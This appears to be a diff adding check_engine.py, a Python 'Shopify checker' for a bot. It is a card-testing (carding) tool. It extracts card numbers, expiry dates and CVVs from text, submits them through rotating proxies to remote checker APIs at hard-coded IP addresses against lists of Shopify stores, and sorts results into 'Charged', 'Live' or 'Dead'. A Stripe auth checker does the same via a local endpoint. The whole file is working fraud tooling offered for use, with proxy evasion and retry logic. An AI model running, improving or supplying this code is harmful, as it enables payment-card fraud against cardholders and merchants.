@@ -1,0 +1,719 @@
+"""
+check_engine.py — FAST Shopify Checker Engine
+Adapted from NARUTO fast engine for RXP bot.
+"""
+import asyncio
+import aiohttp
+import random
+import re
+import time
+import os
+import logging
+from typing import Optional, Tuple, List
+from collections import deque
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ SPEED TUNABLES
+# ══════════════════════════════════════════════════════════════════════════════
+MAX_RETRIES_ENGINE = 200
+BIN_CACHE_TTL = 7200
+SITES_CACHE_TTL = 30
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ API ENDPOINTS
+# ══════════════════════════════════════════════════════════════════════════════
+API_URLS = [
+    "http://198.71.52.78:8083/shopify",
+    "http://5.83.136.90:8083/shopify",
+    "http://5.83.136.90:8087/shopify",
+    "http://5.83.136.90:8089/shopify",
+    "http://5.83.136.90:8088/shopify",
+    "http://5.83.136.90:8081/shopify",
+    "http://5.83.136.90:8084/shopify",
+]
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ SHARED HTTP SESSION (fast, keepalive)
+# ══════════════════════════════════════════════════════════════════════════════
+_MSH_HTTP_SESSION = None
+
+def _get_msh_http_session():
+    global _MSH_HTTP_SESSION
+    if _MSH_HTTP_SESSION is None or _MSH_HTTP_SESSION.closed:
+        _MSH_HTTP_SESSION = aiohttp.ClientSession(
+            timeout=aiohttp.ClientTimeout(total=25, connect=8),
+            connector=aiohttp.TCPConnector(
+                limit=3000,
+                limit_per_host=800,
+                ttl_dns_cache=600,
+                keepalive_timeout=60,
+                enable_cleanup_closed=True,
+                ssl=False,
+                force_close=False,
+            )
+        )
+    return _MSH_HTTP_SESSION
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ BLACKLIST
+# ══════════════════════════════════════════════════════════════════════════════
+_BLACKLIST_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "blacklisted_sites.txt")
+
+def _load_blacklist():
+    if os.path.exists(_BLACKLIST_FILE):
+        with open(_BLACKLIST_FILE, "r", encoding="utf-8", errors="ignore") as f:
+            return set(line.strip() for line in f if line.strip())
+    return set()
+
+def _save_to_blacklist(site):
+    with open(_BLACKLIST_FILE, "a", encoding="utf-8") as f:
+        f.write(site.strip() + "\n")
+
+GLOBAL_BLACKLISTED_SITES = _load_blacklist()
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ PROXY MANAGER
+# ══════════════════════════════════════════════════════════════════════════════
+class ProxyManager:
+    SUCCESS_RESPONSES = [
+        'CARD_DECLINED', 'ORDER_PLACED', 'ORDER_PAID', 'CHARGED', 'APPROVED',
+        'INSUFFICIENT_FUNDS', 'INVALID_CVC', 'INCORRECT_CVC',
+        '3DS_REQUIRED', 'FRAUD_SUSPECTED', 'GENERIC_ERROR',
+        'DO_NOT_HONOR', 'EXPIRED_CARD', 'INCORRECT_ZIP', 'STOLEN_CARD',
+        'LOST_CARD', 'INCORRECT_NUMBER', 'AMOUNT_TOO_SMALL',
+        'TRANSACTION_NOT_ALLOWED', 'RESTRICTED_CARD'
+    ]
+    PROXY_ERROR_PATTERNS = [
+        'connection error', 'connection refused', 'connection reset',
+        'timeout', 'timed out', 'connect timeout',
+        'could not resolve host', 'dns error', 'name resolution',
+        'proxy authentication', 'auth failed', '407',
+        'tunnel failed', 'socks error', 'ssl error',
+        'network unreachable', 'host unreachable',
+        'connection aborted', 'broken pipe', 'socket error',
+        'too many redirects', 'redirect loop',
+        'ECONNREFUSED', 'ECONNRESET', 'ETIMEDOUT', 'ENOTFOUND',
+        'proxy error', 'bad gateway', 'empty psk', 'pasted_fields',
+        '<b>Proxy Dead!</b>', 'tokenization blocked'
+    ]
+
+    def __init__(self, proxies_list, session_id=""):
+        self.session_id = session_id
+        self.raw_proxies = list(set(proxies_list))
+        self.all_proxies = [self._normalize(p) for p in self.raw_proxies]
+        self.all_proxies = [p for p in self.all_proxies if p]
+        self.proxy_queue = deque(self.all_proxies)
+        self.failed_proxies = {}
+        self.success_counts = {proxy: 0 for proxy in self.all_proxies}
+        self.total_uses = 0
+
+    def _normalize(self, proxy):
+        if not proxy or not proxy.strip():
+            return None
+        proxy = proxy.strip()
+        if proxy.startswith(('http://', 'https://')):
+            return proxy
+        if proxy.startswith('socks5://'):
+            return 'http://' + proxy[9:]
+        if '@' in proxy and ':' in proxy.split('@')[0]:
+            return f'http://{proxy}'
+        parts = proxy.split()
+        if len(parts) == 4:
+            user, pwd, host, port = parts
+            return f'http://{user}:{pwd}@{host}:{port}'
+        if ':' in proxy and '@' not in proxy:
+            parts = proxy.split(':')
+            if len(parts) == 2 and parts[1].isdigit():
+                return f'http://{proxy}'
+        return f'http://{proxy}'
+
+    def get_next_proxy(self):
+        if not self.all_proxies:
+            return None, False
+        current_time = time.time()
+        attempts = 0
+        max_attempts = len(self.all_proxies) * 2
+        while attempts < max_attempts:
+            if not self.proxy_queue:
+                self.proxy_queue = deque(self.all_proxies)
+            proxy = self.proxy_queue.popleft()
+            if proxy in self.failed_proxies:
+                fail_data = self.failed_proxies[proxy]
+                cooldown_until = fail_data.get('cooldown_until', 0)
+                if current_time < cooldown_until:
+                    self.proxy_queue.append(proxy)
+                    attempts += 1
+                    continue
+                else:
+                    del self.failed_proxies[proxy]
+            self.proxy_queue.append(proxy)
+            self.total_uses += 1
+            return proxy, True
+        return None, False
+
+    def report_success(self, proxy):
+        self.success_counts[proxy] = self.success_counts.get(proxy, 0) + 1
+        if proxy in self.failed_proxies:
+            del self.failed_proxies[proxy]
+
+    def is_real_proxy_error(self, api_response, http_status=None):
+        response_lower = (api_response or '').lower()
+        for success_indicator in self.SUCCESS_RESPONSES:
+            if success_indicator.lower() in response_lower:
+                return False
+        if '429' in response_lower or 'too many requests' in response_lower:
+            return False
+        if any(x in response_lower for x in ['no available products', 'not shopify', 'site requires login']):
+            return False
+        if 'step ' in response_lower and ('failed' in response_lower or 'error' in response_lower):
+            return False
+        if http_status and http_status in [200, 201, 400, 401, 402, 403, 422, 500]:
+            return False
+        for error_pattern in self.PROXY_ERROR_PATTERNS:
+            if error_pattern in response_lower:
+                return True
+        return False
+
+    def report_result(self, proxy, api_response, http_status=None):
+        current_time = time.time()
+        if self.is_real_proxy_error(api_response, http_status):
+            if proxy not in self.failed_proxies:
+                self.failed_proxies[proxy] = {
+                    'fail_count': 0,
+                    'cooldown_until': 0
+                }
+            fail_data = self.failed_proxies[proxy]
+            fail_data['fail_count'] += 1
+            fail_count = fail_data['fail_count']
+            cooldown_multipliers = [30, 60, 120, 300, 600, 900, 1800]
+            idx = min(fail_count - 1, len(cooldown_multipliers) - 1)
+            fail_data['cooldown_until'] = current_time + cooldown_multipliers[idx]
+        else:
+            self.report_success(proxy)
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ CARD EXTRACTION (telethon compatible)
+# ══════════════════════════════════════════════════════════════════════════════
+def extract_cards_from_text(text):
+    patterns = [
+        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
+        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
+        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
+        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
+        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
+    ]
+    cards = []
+    for pattern in patterns:
+        for match in re.findall(pattern, text):
+            if len(match) == 4:
+                cc, mm, yy, cvv = match
+                mm = mm.zfill(2)
+                if len(yy) == 4:
+                    yy = yy[2:]
+                card = f"{cc}|{mm}|{yy}|{cvv}"
+                if card not in cards:
+                    cards.append(card)
+    return cards
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ RETRY ERRORS
+# ══════════════════════════════════════════════════════════════════════════════
+RETRY_ERRORS = [
+    'Site is password protected', 'INVALID_PAYMENT_METHOD',
+    'PROCESSING_ERROR', 'FRAUD_SUSPECTED', 'INCORRECT_ZIP',
+    'RATE_LIMITED', 'SITE_CURRENCY_MISMATCH', 'SITE_PAYMENT_AMOUNT_MISMATCH',
+    'STILL_PROCESSING', 'Site Error! Status: 404',
+    'Site Error! GraphQL status 400', 'Site Error! GraphQL status 401',
+    'Site Error! GraphQL status 402', 'Site Error! GraphQL status 403',
+    'Site Error! GraphQL status 404', 'Site Error! GraphQL status 409',
+    'INVENTORY_RESERVATION_FAILURE', 'MERCHANDISE_OUT_OF_STOCK',
+    'Throttled', 'DELIVERY_COMPANY_REQUIRED', 'DECISION_RULE_BLOCK',
+    'ARTIFACT_DISSATISFACTION', 'No valid payment method found',
+    'Proxy Error', 'TOKEN_FAIL', 'PAYMENTS_METHOD',
+    'no shipping handle obtained', 'validation_custom',
+    'generic_error', 'error:', 'r4 token empty',
+    'payment method is not shopify!', 'r2 id empty',
+    'product not found', 'hcaptcha detected', 'tax ammount empty',
+    'invalid json in submit response', 'unknown result',
+    'receipt_empty', 'site requires login!', 'failed to get token',
+    'no valid products', 'not shopify!', 'site not supported for now!',
+    'connection error', '504', 'server error', 'client error',
+    'token not found', 'invalid_response', 'curl error',
+    'could not resolve host', 'connect tunnel failed',
+    'timeout', 'proxy error', 'http 429', '429', 'too many requests',
+    'payment method not available', 'site not supported',
+    'captcha_required', 'NO_PRODUCT_FOUND',
+    'step 1 failed', 'step 0 failed', 'step 2 failed', 'step 3 failed',
+    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
+    'missing stableid', 'missing buildid', 'missing sourcetoken',
+    'missing proposal', 'missing submit id',
+    'could not extract session id', 'could not extract delivery handle',
+    'could not extract receiptid', 'fetch products',
+    'Cart failed with status 400', 'Cart failed with status 422',
+    'TAX_NEW_TAX_MUST_BE_ACCEPTED',
+    'DELIVERY_INVALID_POSTAL_CODE_FOR_COUNTRY',
+]
+RETRY_ERRORS_LOWER = tuple(e.lower() for e in RETRY_ERRORS)
+
+DECLINED_RESPONSES_UPPER = tuple(r.upper() for r in [
+    'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE', 'DO NOT HONOR',
+    'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'PICK_UP_CARD',
+    'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED', 'INVALID_PURCHASE_TYPE',
+    'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD', 'AMOUNT_TOO_SMALL',
+    'INCORRECT_NUMBER', 'EXPIRED_CARD'
+])
+CHARGED_KEYS = ("ORDER_PLACED", "ORDER_PAID", "CHARGED", "THANK YOU")
+APPROVED_KEYS = ("INSUFFICIENT_FUNDS", "INCORRECT_CVC", "INVALID_CVC", "3DS_REQUIRED", "OTP_REQUIRED")
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ CACHE
+# ══════════════════════════════════════════════════════════════════════════════
+_BIN_CACHE = {}
+_SITES_CACHE = {"data": [], "ts": 0.0}
+
+def invalidate_sites_cache():
+    _SITES_CACHE["ts"] = 0.0
+
+async def _cached_bin_info(bin6, get_bin_func=None):
+    now = time.time()
+    hit = _BIN_CACHE.get(bin6)
+    if hit and (now - hit[1]) < BIN_CACHE_TTL:
+        return hit[0]
+    try:
+        if get_bin_func:
+            if asyncio.iscoroutinefunction(get_bin_func):
+                info = await get_bin_func(bin6)
+            else:
+                info = await asyncio.to_thread(get_bin_func, bin6)
+        else:
+            from bin_db import get_bin_info as _gbi
+            if asyncio.iscoroutinefunction(_gbi):
+                info = await _gbi(bin6)
+            else:
+                info = await asyncio.to_thread(_gbi, bin6)
+    except Exception:
+        info = ("-", "-", "-", "-", "-", "")
+    _BIN_CACHE[bin6] = (info, now)
+    if len(_BIN_CACHE) > 50000:
+        for k in list(_BIN_CACHE)[:10000]:
+            _BIN_CACHE.pop(k, None)
+    return info
+
+def get_sites_cached(sites_loader=None):
+    now = time.time()
+    if _SITES_CACHE["data"] and (now - _SITES_CACHE["ts"]) < SITES_CACHE_TTL:
+        return _SITES_CACHE["data"]
+    sites = []
+    try:
+        if sites_loader:
+            sites = sites_loader()
+        else:
+            sites_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sites.txt")
+            if os.path.exists(sites_file):
+                with open(sites_file, "r", encoding="utf-8", errors="ignore") as f:
+                    sites = [line.strip() for line in f if line.strip()]
+            sites = [s for s in sites if s not in GLOBAL_BLACKLISTED_SITES]
+    except Exception:
+        pass
+    _SITES_CACHE["data"] = sites
+    _SITES_CACHE["ts"] = now
+    return sites
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ API PROCESSING
+# ══════════════════════════════════════════════════════════════════════════════
+async def process_card_api(cc, mes, ano, cvv, site, proxy):
+    cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
+    api_proxy = proxy
+    for prefix in ("http://", "https://", "socks5://"):
+        if api_proxy.startswith(prefix):
+            api_proxy = api_proxy[len(prefix):]
+            break
+    params = {"site": site, "cc": cc_formatted, "proxy": api_proxy}
+    http_status = None
+    try:
+        _http = _get_msh_http_session()
+        current_api = random.choice(API_URLS)
+        async with _http.get(current_api, params=params) as response:
+            http_status = response.status
+            if response.status == 200:
+                data = await response.json()
+                return (
+                    bool(data.get("Status", False)),
+                    data.get("Response", "Unknown Error"),
+                    site,
+                    data.get("Gateway", "Shopify Payments"),
+                    data.get("Price", "0.00"),
+                    data.get("Currency", "USD"),
+                    "Live" if "live" in str(data.get("Proxy", "Live")).lower() else "Dead",
+                    http_status
+                )
+            return (False, f"API Error: HTTP {response.status}", site, "Shopify Payments", "0.00", "USD", "Error", http_status)
+    except asyncio.CancelledError:
+        raise
+    except Exception as e:
+        return (False, f"Error: {str(e)[:80]}", site, "Shopify Payments", "0.00", "USD", "Error", None)
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ BACKWARD COMPAT — purane bot.py ke liye
+# ══════════════════════════════════════════════════════════════════════════════
+_PROXY_ERR_SIGNALS = (
+    'connection timed out', 'connection timeout', 'timed out',
+    'proxy error', 'proxy dead', 'proxy_error',
+    'eof occurred', 'remote end closed', 'failed to perform',
+    'connection refused', 'connect tunnel failed',
+)
+
+def _is_proxy_err(msg):
+    m = (msg or '').lower()
+    return any(s in m for s in _PROXY_ERR_SIGNALS)
+
+def _make_result(card, status, message, price='-', gateway='Shopify Payments',
+                 receipt_url='', retryable=False, proxy='', time=None):
+    return {
+        'status': status, 'message': message, 'card': card,
+        'gateway': gateway, 'price': price, 'receipt_url': receipt_url,
+        'retry': retryable, 'proxy': proxy, 'time': time,
+    }
+
+def _sanitize_proxy(proxy):
+    if not proxy:
+        return ''
+    p = proxy.strip()
+    if any(x in p.lower() for x in ('myshopify', '.com/', 'https:///', 'http:///')):
+        return ''
+    if ':///' in p:
+        p = p.replace(':///', '://')
+    return p
+
+def _is_valid_host(host):
+    if not host or len(host) < 4:
+        return False
+    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', host):
+        return all(0 <= int(o) <= 255 for o in host.split('.'))
+    if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9.\-]*\.[a-zA-Z]{2,}$', host):
+        return True
+    return False
+
+def _is_valid_port(port):
+    return port.isdigit() and 1 <= int(port) <= 65535
+
+def _proxy_to_url(proxy):
+    if not proxy:
+        return ''
+    p = proxy.strip()
+    protocol = 'http'
+    for prefix in ('http://', 'https://', 'socks5://', 'socks4://'):
+        if p.lower().startswith(prefix):
+            protocol = prefix[:-3]
+            p = p[len(prefix):]
+            break
+    p = p.strip('/')
+    if '@' in p:
+        auth, host_part = p.rsplit('@', 1)
+        if ':' in host_part:
+            host, port = host_part.rsplit(':', 1)
+            if _is_valid_host(host) and _is_valid_port(port):
+                return f'{protocol}://{auth}@{host}:{port}'
+        return ''
+    parts = p.split(':')
+    if len(parts) == 2:
+        if _is_valid_host(parts[0]) and _is_valid_port(parts[1]):
+            return f'{protocol}://{parts[0]}:{parts[1]}'
+    if len(parts) == 4:
+        a, b, c, d = parts
+        if _is_valid_host(a) and _is_valid_port(b):
+            return f'{protocol}://{c}:{d}@{a}:{b}'
+        if _is_valid_host(c) and _is_valid_port(d):
+            return f'{protocol}://{a}:{b}@{c}:{d}'
+    return ''
+
+def _normalize_api_url(url):
+    url = url.strip().rstrip("/")
+    if not url.endswith("/shopify"):
+        url = url + "/shopify"
+    return url
+
+def _normalize_shop_url(shop_url):
+    if not shop_url:
+        return ""
+    s = shop_url.strip()
+    s = re.sub(r'^https:\/+', 'https://', s, flags=re.I)
+    s = re.sub(r'^http:\/+', 'http://', s, flags=re.I)
+    if not re.match(r'^https?://', s, flags=re.I):
+        s = 'https://' + s.lstrip('/')
+    try:
+        from urllib.parse import urlparse
+        p = urlparse(s)
+        if not p.netloc:
+            return ""
+        return f"{(p.scheme or 'https').lower()}://{p.netloc.lower()}"
+    except Exception:
+        return ""
+
+def _strip_protocol(proxy):
+    p = proxy.strip()
+    for prefix in ("http://", "https://", "socks5://", "socks4://"):
+        if p.startswith(prefix):
+            p = p[len(prefix):]
+    return p
+
+async def _call_api(shop_url, card, proxy_raw):
+    clean_proxy = _sanitize_proxy(proxy_raw)
+    if not clean_proxy:
+        return _make_result(card, 'Dead', message="Invalid proxy format", retryable=True)
+    shop_url = _normalize_shop_url(shop_url)
+    if not shop_url:
+        return _make_result(card, 'Dead', message="Invalid site URL", retryable=True)
+    parts = card.split('|')
+    if len(parts) != 4:
+        return _make_result(card, 'Dead', message="Invalid card format", retryable=False)
+    cc, mm, yy, cvv = parts
+    success, response, site, gateway, price, currency, proxy_status, http_status = await process_card_api(
+        cc, mm, yy, cvv, shop_url, clean_proxy
+    )
+    resp_up = response.upper()
+    if any(k in resp_up for k in ("PROXY", "CONNECTION TIMED OUT", "TIMED OUT", "TIMEOUT",
+                                   "EOF OCCURRED", "REMOTE END CLOSED", "CONNECTION REFUSED",
+                                   "CONNECT TUNNEL FAILED", "FAILED TO PERFORM")):
+        return _make_result(card, 'Dead', message=response, retryable=True, proxy=clean_proxy)
+    if any(k in resp_up for k in ("STEP 0", "STEP 1", "STEP 2", "STEP 3", "STEP 4", "STEP 5",
+                                   "SITE ERROR", "SITE NOT", "NOT SHOPIFY", "CLOUDFLARE",
+                                   "CAPTCHA", "CHANGE PROXY", "HTTP_5", "HTTP 5",
+                                   "CART FAILED", "NO PRODUCT", "INVENTORY")):
+        return _make_result(card, 'Dead', message=response, retryable=True, proxy=clean_proxy)
+    if any(k in resp_up for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS",
+                                   "PAYMENTS_INSUFFICIENT_FUNDS", "NOT ENOUGH FUNDS",
+                                   "NOT_ENOUGH_FUNDS", "LOW BALANCE", "LOW_BALANCE",
+                                   "3DS_REQUIRED", "OTP_REQUIRED", "AUTHENTICATION_REQUIRED")):
+        return _make_result(card, 'Live', message=response or "Card Live",
+                            price=price, gateway=gateway, proxy=clean_proxy)
+    if any(k in resp_up for k in ("ORDER_PAID", "ORDER_PLACED", "CHARGED", "THANK YOU",
+                                   "PAYMENT_SUCCESSFUL", "PAYMENT SUCCESSFUL",
+                                   "CAPTURED_SUCCESSFULLY", "PAYMENT CAPTURED",
+                                   "SUCCESSFULLY CHARGED")):
+        return _make_result(card, 'Charged', message=response or "Payment captured",
+                            price=price, gateway=gateway, proxy=clean_proxy)
+    if any(k in resp_up for k in ("CARD_DECLINED", "PAYMENT_FAILED", "MISMATCHED_BILL",
+                                   "DO_NOT_HONOR", "PAYMENT_METHOD_NOT_AVAILABLE",
+                                   "CARD_EXPIRED", "INVALID_CARD", "GENERIC_ERROR",
+                                   "INVALID_CVC", "INCORRECT_CVC", "INCORRECT_ZIP")):
+        return _make_result(card, 'Dead', message=response or "Card Declined",
+                            price=price, gateway=gateway, proxy=clean_proxy, retryable=False)
+    return _make_result(card, 'Dead', message=response or "Unknown",
+                        price=price, gateway=gateway, proxy=clean_proxy, retryable=False)
+
+async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy=None):
+    if not sites:
+        return _make_result(card, 'Dead', 'No sites configured')
+    if not proxies:
+        return _make_result(card, 'Dead', 'No proxy configured')
+
+    last_err = 'Unknown error'
+    MAX_TRIES = 200
+    failed_sites = set()
+    failed_proxies = set()
+
+    for attempt in range(MAX_TRIES):
+        available = [s for s in sites if s not in failed_sites] or list(sites)
+        avail_proxies = [p for p in proxies if p not in failed_proxies] or list(proxies)
+        shop_url = random.choice(available)
+        proxy_raw = (start_proxy if attempt == 0 and start_proxy and start_proxy not in failed_proxies
+                     else random.choice(avail_proxies))
+
+        clean_proxy = _sanitize_proxy(proxy_raw)
+        if not clean_proxy:
+            failed_proxies.add(proxy_raw)
+            last_err = "Invalid proxy format"
+            continue
+
+        try:
+            result = await _call_api(shop_url, card, clean_proxy)
+        except Exception as e:
+            last_err = str(e)
+            failed_sites.add(shop_url)
+            await asyncio.sleep(0.01)
+            continue
+
+        if result['status'] in ('Charged', 'Approved'):
+            result['proxy'] = clean_proxy
+            return result
+
+        if result['status'] == 'Dead' and not result.get('retry'):
+            return result
+
+        last_err = result.get('message', 'Retryable error')
+        if _is_proxy_err(last_err):
+            failed_proxies.add(proxy_raw)
+            await asyncio.sleep(0.01)
+            continue
+        if 'step 0' in last_err.lower() or 'no product' in last_err.lower():
+            failed_sites.add(shop_url)
+        await asyncio.sleep(0.01)
+
+    return _make_result(card, 'Dead', last_err)
+
+def clear_session_bad_sites():
+    pass
+
+def clear_error_log():
+    try:
+        open("error.txt", 'w').close()
+    except Exception:
+        pass
+
+def _log_error_card(card, reason):
+    try:
+        with open("error.txt", 'a', encoding='utf-8') as f:
+            f.write(f"{card}  # {reason[:100]}\n")
+    except Exception:
+        pass
+
+async def test_site(site, proxy):
+    test_card = "5154623245618097|03|2032|156"
+    try:
+        result = await _call_api(site, test_card, proxy)
+        if result['status'] in ('Charged', 'Approved'):
+            return {'site': site, 'status': 'alive'}
+        if result.get('message') and 'API' not in result['message'] and 'proxy' not in result['message'].lower():
+            return {'site': site, 'status': 'alive'}
+        return {'site': site, 'status': 'dead', 'msg': result.get('message', '')[:100]}
+    except Exception as e:
+        msg = str(e)[:80]
+        if 'step' in msg.lower():
+            return {'site': site, 'status': 'step_error', 'msg': msg}
+        return {'site': site, 'status': 'dead', 'msg': msg}
+
+async def test_proxy(proxy):
+    proxy_url = _proxy_to_url(proxy)
+    if not proxy_url:
+        return {'proxy': proxy, 'status': 'dead', 'error': 'Invalid format'}
+    test_urls = ['http://httpbin.org/ip', 'http://api.ipify.org', 'http://icanhazip.com']
+    try:
+        timeout = aiohttp.ClientTimeout(total=15)
+        conn = aiohttp.TCPConnector(ssl=False)
+        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
+            for url in test_urls:
+                try:
+                    async with s.get(url, proxy=proxy_url, allow_redirects=True) as r:
+                        if r.status == 200:
+                            return {'proxy': proxy, 'status': 'alive'}
+                except Exception:
+                    continue
+        return {'proxy': proxy, 'status': 'dead'}
+    except Exception:
+        return {'proxy': proxy, 'status': 'dead'}
+
+async def get_proxy_ip(proxy):
+    proxy_url = _proxy_to_url(proxy)
+    if not proxy_url or proxy_url.startswith('socks'):
+        return None
+    try:
+        timeout = aiohttp.ClientTimeout(total=15)
+        async with aiohttp.ClientSession(timeout=timeout) as s:
+            async with s.get('https://api.ipify.org', proxy=proxy_url) as r:
+                if r.status == 200:
+                    return (await r.text()).strip()
+    except Exception:
+        pass
+    return None
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ STRIPE AUTH CHECKER
+# ══════════════════════════════════════════════════════════════════════════════
+STRIPE_AUTH_API = "http://localhost:9000/stripe_auth"
+
+
+def _normalize_stripe_card(card: str) -> str:
+    import re as _re
+    parts = _re.split(r'[|/\-_\s]+', card.strip())
+    if len(parts) != 4:
+        return ""
+    cc, mm, yy, cvv = parts
+    if not (cc.isdigit() and 15 <= len(cc) <= 16):
+        return ""
+    if not mm.isdigit() or not (1 <= int(mm) <= 12):
+        return ""
+    if not yy.isdigit():
+        return ""
+    if len(yy) == 2:
+        yy = "20" + yy
+    if not cvv.isdigit() or len(cvv) not in (3, 4):
+        return ""
+    digits = [int(d) for d in cc]
+    for i in range(len(digits) - 2, -1, -2):
+        digits[i] *= 2
+        if digits[i] > 9:
+            digits[i] -= 9
+    if sum(digits) % 10 != 0:
+        return ""
+    return f"{cc}|{mm}|{yy}|{cvv}"
+
+
+async def check_stripe_auth(card: str) -> dict:
+    import time as _t
+    normalized = _normalize_stripe_card(card)
+    if not normalized:
+        return {
+            'status': 'Dead', 'message': 'Invalid card format',
+            'card': card, 'gateway': 'Stripe Auth', 'price': '-',
+            'time': 0, 'raw_response': 'INVALID_FORMAT',
+        }
+    t0 = _t.time()
+    try:
+        timeout = aiohttp.ClientTimeout(total=60)
+        conn = aiohttp.TCPConnector(ssl=False)
+        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
+            async with s.get(STRIPE_AUTH_API, params={"cc": normalized}) as r:
+                elapsed = round(_t.time() - t0, 2)
+                if r.status != 200:
+                    return {
+                        'status': 'Dead', 'message': f'HTTP {r.status}',
+                        'card': normalized, 'gateway': 'Stripe Auth', 'price': '-',
+                        'time': elapsed, 'raw_response': f'HTTP_{r.status}',
+                    }
+                try:
+                    data = await r.json()
+                except Exception:
+                    return {
+                        'status': 'Dead', 'message': 'Invalid JSON',
+                        'card': normalized, 'gateway': 'Stripe Auth', 'price': '-',
+                        'time': elapsed, 'raw_response': 'INVALID_JSON',
+                    }
+                approved = data.get('approved', False)
+                status_raw = str(data.get('status', '')).upper()
+                message = data.get('message') or data.get('error') or 'Unknown'
+                message = str(message).strip() or 'Unknown'
+                if approved is True or status_raw == 'APPROVED':
+                    return {
+                        'status': 'Approved',
+                        'message': message if message != 'Unknown' else 'Payment method added',
+                        'card': normalized, 'gateway': 'Stripe Auth', 'price': '-',
+                        'time': elapsed, 'raw_response': 'APPROVED',
+                    }
+                elif status_raw == 'ERROR':
+                    return {
+                        'status': 'Dead',
+                        'message': message if message != 'Unknown' else 'System error',
+                        'card': normalized, 'gateway': 'Stripe Auth', 'price': '-',
+                        'time': elapsed, 'raw_response': 'ERROR',
+                    }
+                else:
+                    return {
+                        'status': 'Dead',
+                        'message': message if message != 'Unknown' else 'Card declined',
+                        'card': normalized, 'gateway': 'Stripe Auth', 'price': '-',
+                        'time': elapsed, 'raw_response': 'DECLINED',
+                    }
+    except asyncio.TimeoutError:
+        return {
+            'status': 'Dead', 'message': 'API timeout',
+            'card': normalized, 'gateway': 'Stripe Auth', 'price': '-',
+            'time': round(_t.time() - t0, 2), 'raw_response': 'TIMEOUT',
+        }
+    except Exception as e:
+        return {
+            'status': 'Dead', 'message': f'Error: {str(e)[:80]}',
+            'card': normalized, 'gateway': 'Stripe Auth', 'price': '-',
+            'time': round(_t.time() - t0, 2), 'raw_response': 'ERROR',
+        }
